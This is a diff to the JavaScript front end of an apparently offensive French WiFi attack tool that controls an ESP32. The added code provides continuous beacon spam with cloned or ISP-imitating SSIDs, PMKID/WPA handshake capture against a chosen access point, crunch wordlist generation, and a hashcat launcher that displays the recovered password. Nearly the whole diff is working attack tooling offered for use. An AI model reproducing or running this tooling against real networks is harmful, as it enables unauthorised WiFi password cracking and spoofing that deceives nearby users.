-    body: JSON.stringify({mode, ssid, channel:ch, count})
+    body: JSON.stringify({mode, ssid, channel:ch, count, custom_ssids: custom})
   }).then(r => r.json()).then(d => {
-    if (d.ok) termLog('beacon-terminal', '[+] Terminé : ' + d.out, 'ok');
-    else      termLog('beacon-terminal', '[x] ' + d.error, 'err');
+    if (d.ok) termLog('beacon-terminal', '[+] Terminé : ' + (d.out || 'OK'), 'ok');
+    else      termLog('beacon-terminal', '[x] ' + (d.error || 'Erreur'), 'err');
   }).catch(e => termLog('beacon-terminal', '[x] ' + e, 'err'));
+}
+
+// SSIDs FR pour affichage client-side (miroir de webui.py _SSIDS_FR)
+const _SSIDS_FR_CLIENT = [
+  'FreeWifi','FreeWifi_secure','Freebox-ABCD','Free 5G',
+  'Livebox-1234','Livebox Fibre','Orange_XXXX','Orange 5G',
+  'SFR_BCDE','SFR WiFi FON','SFR-XXXX',
+  'Bbox-ABCD','BBox-XXXX',
+  'DIRECT-Samsung','DIRECT-Printer',
+  'iPhone de Marc','Android AP','Redmi Note 12',
+];
+
+function _clientSideSsids(mode, ssid, custom) {
+  if (mode === 'fr')     return _SSIDS_FR_CLIENT;
+  if (mode === 'clone')  return ssid ? [ssid] : [];
+  if (mode === 'custom') return custom.length ? custom : [];
+  // random: montrer des exemples indicatifs
+  return ['[aléatoire-1]','[aléatoire-2]','[aléatoire-3]','... (noms générés sur l\'ESP32)'];
+}
+
+function startBeaconContinu() {
+  const mode   = document.getElementById('beacon-mode').value;
+  const ssid   = document.getElementById('beacon-ssid').value.trim();
+  const ch     = +document.getElementById('beacon-ch').value;
+  const custom = document.getElementById('beacon-custom-list').value
+                   .split(/\r?\n/).map(l=>l.trim()).filter(Boolean);
+
+  if (mode === 'clone'  && !ssid)        { alert('SSID requis pour le mode clone'); return; }
+  if (mode === 'custom' && !custom.length) { alert('Entrez au moins un SSID dans la liste personnalisée'); return; }
+
+  termClear('beacon-terminal');
+  termLog('beacon-terminal', `[>] Beacon continu mode=${mode} ch=${ch} — démarrage...`, 'info');
+
+  // Pré-remplir la liste immédiatement (feedback visuel instantané)
+  _updateBeaconList(_clientSideSsids(mode, ssid, custom));
+
+  fetch('/api/beacon/start', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({mode, ssid, channel:ch, custom_ssids: custom})
+  }).then(r => r.json()).then(d => {
+    if (d.ok) {
+      _beaconSetRunning(true);
+      if (d.ssids && d.ssids.length) _updateBeaconList(d.ssids);
+      termLog('beacon-terminal', '[+] Beacon spam actif — vérifiez la liste WiFi de votre téléphone', 'ok');
+      termLog('beacon-terminal', '[*] Cliquez Stopper pour arrêter', 'info');
+      _beaconPoll = setInterval(() => {
+        fetch('/api/beacon/status').then(r => r.json()).then(s => {
+          if (s.ssids && s.ssids.length) _updateBeaconList(s.ssids);
+          if (!s.running) {
+            _beaconSetRunning(false);
+            clearInterval(_beaconPoll); _beaconPoll = null;
+            termLog('beacon-terminal', '[!] Beacon spam arrêté', 'info');
+          }
+        });
+      }, 3000);
+    } else {
+      // mpremote parfois lent — vérifier quand même si le process tourne
+      termLog('beacon-terminal', '[!] Vérification du statut...', 'info');
+      setTimeout(() => {
+        fetch('/api/beacon/status').then(r => r.json()).then(s => {
+          if (s.running) {
+            _beaconSetRunning(true);
+            if (s.ssids && s.ssids.length) _updateBeaconList(s.ssids);
+            termLog('beacon-terminal', '[+] Beacon spam actif', 'ok');
+            _beaconPoll = setInterval(() => {
+              fetch('/api/beacon/status').then(r => r.json()).then(s2 => {
+                if (s2.ssids && s2.ssids.length) _updateBeaconList(s2.ssids);
+                if (!s2.running) {
+                  _beaconSetRunning(false);
+                  clearInterval(_beaconPoll); _beaconPoll = null;
+                  termLog('beacon-terminal', '[!] Beacon spam arrêté', 'info');
+                }
+              });
+            }, 3000);
+          } else {
+            _updateBeaconList([]);
+            termLog('beacon-terminal', '[x] ' + (d.error || d.status || 'Démarrage échoué'), 'err');
+          }
+        });
+      }, 3000);
+    }
+  }).catch(e => { _updateBeaconList([]); termLog('beacon-terminal', '[x] ' + e, 'err'); });
+}
+
+function stopBeacon() {
+  fetch('/api/beacon/stop', {method:'POST'}).then(r => r.json()).then(() => {
+    _beaconSetRunning(false);
+    if (_beaconPoll) { clearInterval(_beaconPoll); _beaconPoll = null; }
+    termLog('beacon-terminal', '[+] Beacon spam stoppé', 'ok');
+  });
 }
 
 // ── Sniffer ────────────────────────────────────────────────────────────────
@@ -849,6 +1449,411 @@ function getCaptures() {
 function esc(s) {
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
 }
+
+// ── PMKID Capture via ESP32 ────────────────────────────────────────────────
+let _pmkidTarget = {bssid:'', ch:6, ssid:''};
+let _pmkidHashes = [];
+
+function switchTab(name) {
+  document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
+  document.querySelectorAll('[data-tab]').forEach(x => x.classList.remove('active'));
+  const tab = document.getElementById('tab-' + name);
+  if (tab) tab.style.display = '';
+  const link = document.querySelector('[data-tab="' + name + '"]');
+  if (link) link.classList.add('active');
+  currentTab = name;
+  if (name === 'pmkid') {
+    updatePmkidInfo();
+    loadWordlists();
+    loadHashcatDevices();
+  }
+}
+
+function updatePmkidInfo() {
+  document.getElementById('pmkid-info-ssid').textContent  = _pmkidTarget.ssid  || '—';
+  document.getElementById('pmkid-info-bssid').textContent = _pmkidTarget.bssid || '—';
+  document.getElementById('pmkid-info-ch').textContent    = _pmkidTarget.ch    || '—';
+}
+
+function startPmkidCapture() {
+  if (!_pmkidTarget.bssid) { alert('Sélectionnez un réseau dans le Scanner'); return; }
+  _pmkidHashes = [];
+  switchTab('pmkid');
+  termClear('pmkid-terminal');
+  termLog('pmkid-terminal', '[*] Démarrage capture PMKID sur ' + _pmkidTarget.ssid + ' (' + _pmkidTarget.bssid + ')', 'info');
+
+  const url = '/api/stream/pmkid?bssid=' + encodeURIComponent(_pmkidTarget.bssid)
+            + '&channel=' + _pmkidTarget.ch
+            + '&ssid='    + encodeURIComponent(_pmkidTarget.ssid)
+            + '&duration=60';
+  const es = new EventSource(url);
+  es.onmessage = e => {
+    const msg = JSON.parse(e.data);
+    if (msg === '__END__') {
+      es.close();
+      termLog('pmkid-terminal', '[+] Capture terminée', 'ok');
+      if (_pmkidHashes.length) {
+        document.getElementById('pmkid-hash-section').style.display = '';
+        document.getElementById('pmkid-hash-box').value = _pmkidHashes.join('\n');
+        parseHashDisplay();
+      }
+      return;
+    }
+    if (typeof msg === 'string' && msg.startsWith('HASH:')) {
+      _pmkidHashes.push(msg.slice(5));
+      termLog('pmkid-terminal', '[+] Hash : ' + msg.slice(5).substring(0,40) + '…', 'ok');
+    } else {
+      const cls = msg.includes('[+]') ? 'ok' : msg.includes('[x]') ? 'err' : 'info';
+      termLog('pmkid-terminal', msg, cls);
+    }
+  };
+  es.onerror = () => { es.close(); termLog('pmkid-terminal', '[x] Connexion SSE perdue', 'err'); };
+}
+
+
+function loadHashcatDevices() {
+  const sel = document.getElementById('pmkid-device');
+  sel.innerHTML = '<option value="">Chargement…</option>';
+  fetch('/api/hashcat/devices').then(r => r.json()).then(d => {
+    if (!d.ok || !d.devices.length) {
+      sel.innerHTML = '<option value="">Auto (défaut)</option>';
+      return;
+    }
+    sel.innerHTML = d.devices.map(dev => {
+      const isGpu = dev.type.toLowerCase().includes('gpu');
+      const icon = isGpu ? '🖥 GPU' : '🔲 CPU';
+      const dtype = isGpu ? 'GPU' : 'CPU';
+      return `<option value="${dev.id}" data-dtype="${dtype}">${icon} #${dev.id} — ${dev.name}</option>`;
+    }).join('');
+    // Si un seul device, le sélectionner automatiquement
+    if (d.devices.length === 1) {
+      const info = document.getElementById('pmkid-device-info');
+      if (info) info.textContent = d.devices[0].type.includes('CPU')
+        ? '⚠ CPU uniquement — crack plus lent qu\'un GPU'
+        : '✓ GPU détecté — crack accéléré';
+    }
+  }).catch(() => {
+    sel.innerHTML = '<option value="">Auto (défaut)</option>';
+  });
+}
+
+// ── Wordlist manager + crunch builder ──────────────────────────────────────────
+
+function loadWordlists(onLoaded) {
+  const sel = document.getElementById('pmkid-wordlist-sel');
+  sel.innerHTML = '<option value="">Chargement…</option>';
+  fetch('/api/wordlists').then(r => r.json()).then(d => {
+    if (!d.ok || !d.lists.length) {
+      sel.innerHTML = '<option value="/usr/share/wordlists/rockyou.txt">rockyou.txt</option>';
+      if (onLoaded) onLoaded(d.lists || []);
+      return;
+    }
+    const sys = d.lists.filter(l => l.type === 'system');
+    const cus = d.lists.filter(l => l.type === 'custom');
+    let html = '';
+    if (sys.length) {
+      html += '<optgroup label="— Listes système —">';
+      sys.forEach(l => { html += `<option value="${l.path}">${l.name} (${_fmtSize(l.size)})</option>`; });
+      html += '</optgroup>';
+    }
+    if (cus.length) {
+      html += '<optgroup label="— Mes listes personnalisées —">';
+      cus.forEach(l => { html += `<option value="${l.path}">${l.name} (${_fmtSize(l.size)})</option>`; });
+      html += '</optgroup>';
+    }
+    sel.innerHTML = html;
+    // Enrichir select du builder crunch
+    const appSel = document.getElementById('crunch-append-sel');
+    let ap = '<option value="">Choisir une liste à enrichir…</option>';
+    d.lists.forEach(l => { ap += `<option value="${l.path}">${l.name} (${_fmtSize(l.size)})</option>`; });
+    appSel.innerHTML = ap;
+    if (onLoaded) onLoaded(d.lists);
+  }).catch(() => {
+    sel.innerHTML = '<option value="/usr/share/wordlists/rockyou.txt">rockyou.txt</option>';
+    if (onLoaded) onLoaded([]);
+  });
+}
+
+function _fmtSize(b) {
+  if (b < 1024) return b + ' B';
+  if (b < 1048576) return (b/1024).toFixed(0) + ' KB';
+  if (b < 1073741824) return (b/1048576).toFixed(1) + ' MB';
+  return (b/1073741824).toFixed(2) + ' GB';
+}
+
+function toggleCrunchBuilder() {
+  const div = document.getElementById('crunch-builder');
+  div.style.display = div.style.display === 'none' ? '' : 'none';
+  if (div.style.display !== 'none') updateCrunchEstimate();
+}
+
+function toggleCrunchPattern() {
+  const on = document.getElementById('crunch-use-pattern').checked;
+  document.getElementById('crunch-pattern-div').style.display  = on ? '' : 'none';
+  document.getElementById('crunch-charset-section').style.display = on ? 'none' : '';
+  document.getElementById('crunch-mode-hint').textContent = on ? 'mode motif' : 'mode charset';
+  if (!on) document.getElementById('crunch-pattern').value = '';
+  updateCrunchEstimate();
+}
+
+function syncPatternLength() {
+  const pat = document.getElementById('crunch-pattern').value;
+  const hint = document.getElementById('crunch-pattern-hint');
+  const prev = document.getElementById('crunch-pattern-preview');
+  if (pat.length > 0) {
+    // Auto-sync min/max to pattern length
+    document.getElementById('crunch-min').value = pat.length;
+    document.getElementById('crunch-max').value = pat.length;
+    document.getElementById('crunch-pat-len').textContent = pat.length;
+    hint.style.display = '';
+    // Aperçu d'un exemple de mot généré
+    const example = pat.split('').map(c => {
+      if (c === '@') return 'a';
+      if (c === ',') return 'A';
+      if (c === '%') return '0';
+      if (c === '^') return '!';
+      return c;
+    }).join('');
+    prev.textContent = 'Aperçu : ' + example;
+    prev.style.display = '';
+  } else {
+    hint.style.display = 'none';
+    prev.style.display = 'none';
+  }
+  updateCrunchEstimate();
+}
+
+function toggleCrunchAppend() {
+  const m = document.querySelector('[name=crunch-mode]:checked').value;
+  document.getElementById('crunch-append-sel').style.display = m === 'append' ? '' : 'none';
+}
+
+function _crunchCharset() {
+  const r = document.querySelector('[name=crunch-preset]:checked');
+  if (!r) return '0123456789';
+  return r.value === 'custom'
+    ? (document.getElementById('crunch-custom-charset').value || '0123456789')
+    : r.value;
+}
+
+function updateCrunchEstimate() {
+  const min = Math.max(1, +document.getElementById('crunch-min').value || 1);
+  const max = Math.max(min, +document.getElementById('crunch-max').value || 1);
+  const usePat = document.getElementById('crunch-use-pattern').checked;
+  const div = document.getElementById('crunch-estimate');
+  let total = 0n;
+  if (usePat) {
+    const pat = document.getElementById('crunch-pattern').value || '';
+    const at = (pat.match(/@/g)||[]).length, cm = (pat.match(/,/g)||[]).length;
+    const pc = (pat.match(/%/g)||[]).length,  ht = (pat.match(/\^/g)||[]).length;
+    total = 26n**BigInt(at) * 26n**BigInt(cm) * 10n**BigInt(pc) * 33n**BigInt(ht);
+  } else {
+    const n = BigInt(Math.max(1, _crunchCharset().length));
+    for (let l = min; l <= Math.min(max, 20); l++) total += n**BigInt(l);
+  }
+  const avgLen = BigInt(Math.round((min + max) / 2) + 1);
+  const szBytes = Number(total * avgLen);
+  let warn = '', color = '#8b949e';
+  if (total > 1_000_000_000n) { warn = ' — 🚨 Extrêmement volumineux !'; color = '#ff7b72'; }
+  else if (total > 100_000_000n) { warn = ' — ⚠ Très volumineux'; color = '#d29922'; }
+  const totalStr = total > 1_000_000_000n ? (Number(total/1_000_000_000n)) + ' Md'
+    : total > 1_000_000n ? (Number(total)/1e6).toFixed(1) + ' M'
+    : total > 1000n ? (Number(total)/1000).toFixed(0) + ' K'
+    : total.toString();
+  div.innerHTML = `Estimation : ~${totalStr} mots (~${_fmtSize(szBytes)})${warn}`;
+  div.style.color = color;
+}
+
+function buildWordlist() {
+  const min    = document.getElementById('crunch-min').value;
+  const max    = document.getElementById('crunch-max').value;
+  const usePat = document.getElementById('crunch-use-pattern').checked;
+  const charset = usePat ? '' : _crunchCharset();
+  const pattern = usePat ? document.getElementById('crunch-pattern').value : '';
+  const name   = (document.getElementById('crunch-name').value.trim() || 'custom_' + Date.now()).replace(/\s+/g,'_');
+  const mode   = document.querySelector('[name=crunch-mode]:checked').value;
+  const append = mode === 'append' ? document.getElementById('crunch-append-sel').value : '';
+
+  if (!charset && !pattern) { alert('Jeu de caractères ou motif requis'); return; }
+
+  const term = document.getElementById('crunch-terminal');
+  term.style.display = '';
+  term.innerHTML = '';
+  termLog('crunch-terminal', `[*] Génération : min=${min} max=${max} charset="${charset || pattern}"`, 'info');
+
+  const params = new URLSearchParams({min, max, charset, pattern, name, append});
+  const es = new EventSource('/api/wordlists/build?' + params);
+  es.onmessage = e => {
+    const msg = JSON.parse(e.data);
+    if (msg.status === 'cmd') {
+      termLog('crunch-terminal', '$ ' + msg.msg, 'info');
+    } else if (msg.status === 'log') {
+      termLog('crunch-terminal', msg.msg, 'info');
+    } else if (msg.status === 'done') {
+      es.close();
+      const added = msg.added?.toLocaleString() || '?';
+      const total = msg.total?.toLocaleString() || added;
+      termLog('crunch-terminal', `[+] Terminé : ${added} mots ajoutés → ${msg.name} (total ${total})`, 'ok');
+      // Recharger la liste puis sélectionner la nouvelle via callback
+      loadWordlists(lists => {
+        const sel = document.getElementById('pmkid-wordlist-sel');
+        const target = msg.path || '';
+        for (const opt of sel.options) {
+          if (opt.value && (opt.value === target || opt.value.includes(msg.name.replace('.txt','')))) {
+            sel.value = opt.value;
+            termLog('crunch-terminal', `[✓] Wordlist sélectionnée : ${opt.text}`, 'ok');
+            break;
+          }
+        }
+      });
+    } else if (msg.status === 'error') {
+      es.close();
+      termLog('crunch-terminal', '[x] Erreur crunch : ' + msg.msg, 'err');
+    }
+  };
+  es.onerror = () => { es.close(); termLog('crunch-terminal', '[x] Connexion SSE perdue', 'err'); };
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+
+function loadHashFile(input) {
+  const file = input.files[0];
+  if (!file) return;
+  const reader = new FileReader();
+  reader.onload = e => {
+    const lines = e.target.result.split('\n').map(l => l.trim()).filter(l => l.startsWith('WPA*'));
+    if (!lines.length) { alert('Aucun hash WPA valide trouvé dans ce fichier.'); return; }
+    document.getElementById('pmkid-hash-section').style.display = '';
+    document.getElementById('pmkid-hash-box').value = lines.join('\n');
+    parseHashDisplay();
+    termLog('pmkid-terminal', `[+] ${lines.length} hash(es) chargés depuis ${file.name}`, 'ok');
+    input.value = '';
+  };
+  reader.readAsText(file);
+}
+
+// ── Hash hc22000 parser ────────────────────────────────────────────────────────
+// Format: WPA*02*MIC*AP_MAC*STA_MAC*SSID_HEX*NONCE*EAPOL*FLAGS
+function parseHashDisplay() {
+  const raw   = document.getElementById('pmkid-hash-box').value.trim().split('\n')[0] || '';
+  const wrap  = document.getElementById('hash-parsed');
+  const table = document.getElementById('hash-parsed-table');
+  if (!raw.startsWith('WPA*')) { wrap.style.display = 'none'; return; }
+
+  const f = raw.split('*');
+  if (f.length < 9) { wrap.style.display = 'none'; return; }
+
+  const hexToMac = h => h.match(/.{2}/g).join(':').toUpperCase();
+  const hexToStr = h => { try { return decodeURIComponent(h.replace(/../g, '%$&')); } catch { return h; } };
+  const short    = (h, n=20) => h.length > n*2 ? h.slice(0, n) + '…' : h;
+
+  const ssidHex = f[5];
+  const ssidStr = hexToStr(ssidHex);
+  const msgPair = parseInt(f[8], 16);
+  const pairDesc = ['(1→2)', '(2→3)', '(3→4)', '(4→1)', '(identifié depuis Beacon)'];
+  const pairInfo = msgPair <= 4 ? `Message ${msgPair} ${pairDesc[msgPair-1]||''}` : `flags=0x${f[8]}`;
+
+  const rows = [
+    ['Type',         '#79c0ff', f[0],    'Protocole WPA capturé'],
+    ['Version',      '#79c0ff', f[1],    f[1]==='02' ? 'WPA2 (EAPOL 4-way handshake)' : 'WPA1'],
+    ['MIC',          '#ffa657', f[2],    'Message Integrity Code — valeur à cracker'],
+    ['AP BSSID',     '#3fb950', hexToMac(f[3]), 'MAC de l\'AP (routeur)'],
+    ['Station MAC',  '#d2a8ff', hexToMac(f[4]), 'MAC du client qui s\'est connecté'],
+    ['SSID',         '#f2cc60', `${ssidStr}`, `Nom réseau (hex: ${ssidHex})`],
+    ['ANonce',       '#8b949e', short(f[6]), 'Nonce aléatoire de l\'AP (32 oct.)'],
+    ['EAPOL frame',  '#8b949e', short(f[7]), `Trame EAPOL brute (${f[7].length/2} octets)`],
+    ['Paire msg',    '#58a6ff', pairInfo, 'Indice de la paire de messages utilisée'],
+  ];
+
+  table.innerHTML = rows.map(([label, color, val, tip]) =>
+    `<tr>
+       <td style="color:${color};font-weight:600;padding:2px 8px 2px 0;white-space:nowrap;
+                  vertical-align:top;width:110px">${label}</td>
+       <td style="font-family:monospace;color:#e6edf3;padding:2px 6px;word-break:break-all">${val}</td>
+       <td style="color:#6e7681;padding:2px 0 2px 4px;font-style:italic;font-size:10px;
+                  vertical-align:top">${tip}</td>
+     </tr>`
+  ).join('');
+
+  wrap.style.display = '';
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+
+function _hashcatSetRunning(on) {
+  const startBtn = document.getElementById('hashcat-start-btn');
+  const stopBtn  = document.getElementById('hashcat-stop-btn');
+  startBtn.disabled = on;
+  startBtn.innerHTML = on
+    ? '<span class="spinner-border spinner-border-sm me-2"></span>Crack en cours…'
+    : '<i class="bi bi-key-fill me-2"></i>Lancer hashcat';
+  stopBtn.style.display = on ? '' : 'none';
+}
+
+function stopHashcat() {
+  if (_hashcatES) { _hashcatES.close(); _hashcatES = null; }
+  fetch('/api/hashcat/stop', {method:'POST'}).then(r => r.json()).then(d => {
+    termLog('pmkid-terminal', d.ok ? '[!] Hashcat arrêté.' : '[x] ' + d.msg, d.ok ? 'info' : 'err');
+    _hashcatSetRunning(false);
+  }).catch(e => termLog('pmkid-terminal', '[x] ' + e, 'err'));
+}
+
+let _hashcatES = null;
+
+function launchHashcat() {
+  // Envoyer TOUS les hashes (pas seulement le premier) — hashcat trouvera le bon
+  const hash      = document.getElementById('pmkid-hash-box').value.trim()
+                      .split('\n').filter(l => l.startsWith('WPA*')).join('\n');
+  const wl        = document.getElementById('pmkid-wordlist-sel').value || '/usr/share/wordlists/rockyou.txt';
+  const selEl     = document.getElementById('pmkid-device');
+  const device_id   = selEl.value;
+  const device_type = selEl.selectedOptions[0]?.dataset?.dtype || '';
+  if (!hash) { alert('Aucun hash disponible'); return; }
+  if (_hashcatES) { _hashcatES.close(); }
+
+  const devLabel = selEl.selectedOptions[0]?.text || 'auto';
+  termLog('pmkid-terminal', `[*] Lancement hashcat (${devLabel})…`, 'info');
+  termLog('pmkid-terminal', `[*] Wordlist : ${wl}`, 'info');
+  document.getElementById('pmkid-result').style.display = 'none';
+  _hashcatSetRunning(true);
+
+  const params = new URLSearchParams({hash, wordlist: wl, device_id, device_type});
+  _hashcatES = new EventSource('/api/hashcat/stream?' + params);
+
+  _hashcatES.onmessage = e => {
+    const msg = JSON.parse(e.data);
+    if (msg.type === 'log') {
+      // Filtrer les lignes utiles : vitesse, progression, ETA
+      const l = msg.msg;
+      const isUseful = l.includes('Speed') || l.includes('Progress')
+                    || l.includes('ETA') || l.includes('Time')
+                    || l.includes('Recovered') || l.startsWith('$')
+                    || l.includes('Session') || l.includes('Status');
+      if (isUseful) termLog('pmkid-terminal', l, 'info');
+    } else if (msg.type === 'found') {
+      _hashcatES.close(); _hashcatES = null;
+      _hashcatSetRunning(false);
+      termLog('pmkid-terminal', '[+] MOT DE PASSE TROUVÉ : ' + msg.password, 'ok');
+      const res = document.getElementById('pmkid-result');
+      res.style.display = '';
+      res.querySelector('.pmkid-pwd').textContent = msg.password;
+    } else if (msg.type === 'done') {
+      _hashcatES.close(); _hashcatES = null;
+      _hashcatSetRunning(false);
+      termLog('pmkid-terminal', '[!] Non trouvé dans cette wordlist', 'info');
+    } else if (msg.type === 'error') {
+      _hashcatES.close(); _hashcatES = null;
+      _hashcatSetRunning(false);
+      termLog('pmkid-terminal', '[x] ' + msg.msg, 'err');
+    }
+  };
+  _hashcatES.onerror = () => {
+    _hashcatES.close(); _hashcatES = null;
+    _hashcatSetRunning(false);
+    termLog('pmkid-terminal', '[x] Connexion SSE perdue', 'err');
+  };
+}
 </script>
+
 </body>
 </html>
